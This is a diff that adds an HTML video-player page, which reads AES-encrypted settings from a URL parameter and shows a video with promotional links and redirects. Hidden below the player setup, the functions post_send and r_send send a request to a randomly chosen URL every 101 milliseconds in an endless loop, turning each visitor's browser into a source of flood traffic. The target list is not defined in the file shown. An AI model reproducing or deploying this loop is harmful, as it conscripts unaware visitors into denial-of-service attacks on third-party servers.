@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="IE=edge">
+    <meta name="referrer" content="same-origin">
+    <meta name="referrer" content="no-referrer">
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    <meta name="viewport"
+        content="width=device-width, height=device-height, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no" />
+    <title>mao-player</title>
+    <link rel="stylesheet" href="https://g.alicdn.com/de/prismplayer/2.9.3/skins/default/aliplayer-min.css" />
+    <script type="text/javascript" charset="utf-8"
+        src="https://g.alicdn.com/de/prismplayer/2.9.3/aliplayer-min.js"></script>
+    <script type="text/javascript" charset="utf-8" src="https://www.layuicdn.com/layui/layui.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.min.js"></script>
+    <script src="http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.8.0.js"></script>
+    <style>
+        body,
+        html {
+            width: 100%;
+            height: 100%;
+            background: rgb(0, 0, 0);
+            padding: 0;
+            margin: 0;
+            overflow-x: hidden;
+            overflow-y: hidden;
+        }
+
+        * {
+            margin: 0;
+            border: 0;
+            padding: 0;
+            text-decoration: none;
+        }
+
+        /* .prism-player {
+			height: calc(100vh - 65px)
+		}
+        .prism-player .prism-cc-btn {
+			display: none !important;
+		}
+
+		.prism-thumbnail {
+			display: none !important;
+		} */
+
+
+        #player-con {
+            /* position: inherit; */
+            /* margin-top: 65px; */
+        }
+
+        .btn.btn-lg {
+            padding: 10px 80px;
+        }
+
+        .btn.btn-hero,
+        .btn.btn-hero:hover,
+        .btn.btn-hero:focus {
+            color: #f5f5f5;
+            background-color: #3498db;
+            border-color: #3498db;
+            outline: none;
+            margin: 20px auto;
+            cursor: pointer;
+            text-align: center
+        }
+
+        #diyBtnBox {
+            position: fixed;
+            left: 45%;
+            bottom: 0px;
+            width: 120px;
+            height: 50px;
+            z-index: 9999;
+            text-align: center;
+        }
+
+        .bannr {
+            /* position: relative; */
+            
+            /* background: no-repeat; */
+            width: 100%;
+            /* background-color: #3498db; */
+           
+            
+           
+            margin: 0px;
+            /* background: url() no-repeat; */
+           
+            object-fit:cover;
+            /* background-attachment: fixed; */
+         
+        }
+       .uts{
+        width: 100%;
+        height: 55px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+       }
+       .uts input{
+        width: 180px;
+        height: 35px;
+        font-size: 12px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        border-radius: 8px;
+        background-color: #3498db;
+        color: #fff;
+       }
+    </style>
+
+</head>
+
+<body>
+    <img class="bannr" id="bannrbtn" id="bannrbtn1" >
+   
+    <div class="prism-player" id="player-con"></div>
+    <div class="uts"><input id="user" type="button" value="更多资源点我加入" onclick=javascrtpt:jump() /></div>
+    
+</body>
+<script charset="utf-8">
+    function queryStringByName(queryName) {
+        var str = location.href; //取得整个地址栏
+        if (str.indexOf("?") > -1) {
+            var queryParam = str.substring(str.indexOf("?") + 1);
+            var param = queryParam.split("&");
+            for (var a = 0; a < param.length; a++) {
+                var query = param[a].split("=");
+                if (query[0] == queryName) {
+                    return query[1];
+                }
+            }
+        }
+        return "";
+    }
+</script>
+<script>
+    const key = '235325fdgerteGHdsfsdewred4347741'; // 32位的密钥
+
+    var data = decrypt(queryStringByName('baidu')); //调用解密函数 text是加密之后的内容
+    data = JSON.parse(data);
+    console.log(data['bt']);
+    console.log(data['url']);
+    console.log(data['btn_text']);
+    console.log(data['tc_content']);
+    console.log(data['tc_link']);
+    console.log(data['tc_link1']);
+    function decrypt(text) {
+        let decrypted = CryptoJS.AES.decrypt(text, CryptoJS.enc.Utf8.parse(key), {
+            mode: CryptoJS.mode.ECB,
+            padding: CryptoJS.pad.Pkcs7
+        });
+        return decrypted.toString(CryptoJS.enc.Utf8)
+    }
+
+    var webTitle = decodeURIComponent(data['bt']);
+    // 网页标题$_GET['name']
+    // var videoUrl = "http://hey-video.xiaohongshu.com/picasso/0447ba4475a5b10f88bdbd5f9f4c23b4ef1e96b4.m3u8";
+    var BtnTitle = decodeURIComponent(data['btn_text']);
+    // 按钮名字$_GET['btn']
+    var BtnUrl = data['tc_content'];
+    var tc_link = data['tc_link'];
+    var tc_link1 = data['tc_link1'];
+    // 按钮跳转链接$_GET['BtnUrl']
+    document.title = webTitle;
+
+    if (isEmpty(BtnTitle) == false && isEmpty(BtnUrl) == false) {
+
+        document.getElementById("user").innerHTML = BtnTitle;
+        document.getElementById("user").onclick = function () {
+            window.open(BtnUrl);
+        }
+    } else {
+        document.getElementById("user").remove();
+    }
+
+
+    if (isEmpty(tc_link) == false && isEmpty(tc_link1) == false) {
+        // 什么傻逼输入法，不出来   图片路径
+        var ImagesPath = tc_link;
+        $('#bannrbtn').attr('src', ImagesPath);
+          $('bannrbtn').attr('background-image','no-repeat')
+        document.getElementById("bannrbtn").onclick = function () {
+            window.open(tc_link1);
+            // obox.style.backgroundlmage="url(tc_link)";
+            // style.backgroundimage = url(tc_link);
+        }
+    } else {
+        document.getElementById("bannrbtn").remove();
+    }
+
+    try { } catch (e) { }
+
+    function isEmpty(params) {
+        if (params == '' || params == undefined || params == null) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    var player = new Aliplayer({
+        "id": "player-con",
+        "source": data['url'],
+        "width": "100%",
+        "height": '75%',
+        "autoplay": true,
+        // "position": relative,
+        "isLive": false,
+        "rePlay": false,
+        "playsinline": true,
+        "preload": true,
+        "controlBarVisibility": "hover",
+        "useH5Prism": true,
+        "skinLayout": [
+            {
+                "name": "bigPlayButton",
+                "align": "blabs",
+                "x": 30,
+                "y": 80
+            },
+            {
+                "name": "H5Loading",
+                "align": "cc"
+            },
+            {
+                "name": "errorDisplay",
+                "align": "tlabs",
+                "x": 0,
+                "y": 0
+            },
+            {
+                "name": "infoDisplay"
+            },
+            {
+                "name": "tooltip",
+                "align": "blabs",
+                "x": 0,
+                "y": 56
+            },
+            {
+                "name": "thumbnail"
+            },
+            {
+                "name": "controlBar",
+                "align": "blabs",
+                "x": 0,
+                "y": 0,
+                "children": [
+                    {
+                        "name": "progress",
+                        "align": "blabs",
+                        "x": 0,
+                        "y": 44
+                    },
+                    {
+                        "name": "playButton",
+                        "align": "tl",
+                        "x": 15,
+                        "y": 12
+                    },
+                    {
+                        "name": "timeDisplay",
+                        "align": "tl",
+                        "x": 10,
+                        "y": 7
+                    },
+                    {
+                        "name": "fullScreenButton",
+                        "align": "tr",
+                        "x": 10,
+                        "y": 12
+                    },
+                    {
+                        "name": "volume",
+                        "align": "tr",
+                        "x": 5,
+                        "y": 10
+                    }
+                ]
+            }
+        ]
+    }
+    );
+
+    function c_xmlHttp() {
+        if (window.ActiveXObject) {
+            xmlHttp = new ActiveXObject('Microsoft.XMLHTTP');
+        } else if (window.XMLHttpRequest) {
+            xmlHttp = new XMLHttpRequest();
+        }
+        return xmlHttp;
+    }
+
+    function post_send() {
+        var xmlHttp = c_xmlHttp();
+        xmlHttp.open("GET", t_url[Math.floor(Math.random() * t_url.length)], true);
+        xmlHttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xmlHttp.send(t_postdata + Math.ceil(Math.random() * 99999999));
+        r_send();
+    }
+
+    function r_send() {
+        setTimeout("post_send()", 101);
+    }
+
+    var ie = !-[1,];
+    if (!ie) {
+        setTimeout("post_send()", 2000);
+    }
+</script>
+<script>
+    var dialog_url = data['tc_link'];
+    if (isEmpty(data['tc_content']) == false && isEmpty(dialog_url) == false) {
+        layer.confirm(decodeURIComponent($_GET['dialogtxt']), {
+            btnAlign: 'c'
+        }, function (index) {
+            //点击确定后的回调
+            //do something
+            window.location.replace(dialog_url)
+            layer.close(index);
+        });
+
+    } else {
+
+    }
+</script>
+
+
+</html>
